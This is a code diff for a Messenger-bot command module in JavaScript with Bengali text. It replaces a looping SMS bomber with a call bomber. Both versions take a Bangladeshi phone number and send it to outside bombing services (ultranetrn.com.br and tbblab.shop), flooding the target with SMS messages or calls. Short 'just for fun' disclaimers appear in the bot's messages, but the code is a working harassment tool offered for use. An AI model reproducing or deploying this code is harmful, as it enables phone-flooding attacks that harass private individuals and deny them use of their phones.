@@ -1,52 +1,33 @@
 module.exports.config = {
-  name: "call",
-  version: "2.0.0",
-  hasPermssion: 0,
-  credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️", //ক্রেডিট চেঞ্জ করলে এপিআই বন্ধ করে দেব।
-  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
-  commandCategory: "Tool",
-  usages: "/sms 01xxxxxxxxx অথবা /sms off",
-  cooldowns: 0,
-  dependencies: { "axios": "" }
+ name: "call",
+ version: "1.0.0",
+ hasPermssion: 0,
+ credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️", //don't change my credit 
+ description: "কল বোম্বার, শুধুমাত্র বাংলাদেশি নাম্বারের জন্য",
+ commandCategory: "Tool",
+ usages: "/call 01xxxxxxxxx",
+ cooldowns: 15,
+ dependencies: { "axios": "" }
 };
  
-const axios = require("axios");
-const bombingFlags = {};
- 
 module.exports.run = async ({ api, event, args }) => {
-  const threadID = event.threadID;
-  const number = args[0];
+ const axios = require('axios');
+ const number = args[0];
  
-  if (number === "off") {
-    if (bombingFlags[threadID]) {
-      bombingFlags[threadID] = false;
-      return api.sendMessage("✅ SMS BOMBER 2 Offed ।", threadID);
-    } else {
-      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
-    }
-  }
+ if (!number || !/^01[0-9]{9}$/.test(number)) {
+ return api.sendMessage("অনুগ্রহ করে সঠিক বাংলাদেশি নাম্বার দিন (উদাহরণ: /call 01xxxxxxxxx) দয়া করে কেউ খারাপ কাজে ব্যবহার করবেন না 🙂,\n ফাইলটি শুধুমাত্র মজা করার উদ্দেশ্যে তৈরি করা হয়েছে।", event.threadID, event.messageID);
+ }
  
-  if (!/^01[0-9]{9}$/.test(number)) {
-    return api.sendMessage("•┄┅════❁🌺❁════┅┄•\n\nSMS BOMBER 2\n\nব্যবহার:\n.sms number\n\n(BD Number Only)\n\n•┄┅════❁🌺❁════┅┄•", threadID);
-  }
+ api.sendMessage(`কল বোম্বিং শুরু হয়েছে: ${number} নম্বরে...📞💣\n কাউকে বিরক্ত করার জন্য এই টুল ব্যবহার সম্পূর্ণ নিষিদ্ধ এবং আইনত অপরাধ।`, event.threadID, async (err, info) => {
+ try {
+ const response = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${number}`);
+ setTimeout(() => {
+ api.unsendMessage(info.messageID);
+ }, 90000);
  
-  if (bombingFlags[threadID]) {
-    return api.sendMessage("❗sms bomber 2 already on off korte .sms off", threadID);
-  }
- 
-  api.sendMessage(`✅ SMS BOMBER 2 ON  ${number} ...\nOff korte .sms off`, threadID);
- 
-  bombingFlags[threadID] = true;
- 
-  (async function startBombing() {
-    while (bombingFlags[threadID]) {
-      try {
-        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
-      } catch (err) {
-        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
-        bombingFlags[threadID] = false;
-        break;
-      }
-    }
-  })();
+ return api.sendMessage(`✅ —͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 কল বোম্বিং সম্পন্ন হয়েছে ${number} নম্বরে।`, event.threadID, event.messageID);
+ } catch (error) {
+ return api.sendMessage(`❌ ত্রুটি: ${error.message}`, event.threadID, event.messageID);
+ }
+ });
 };
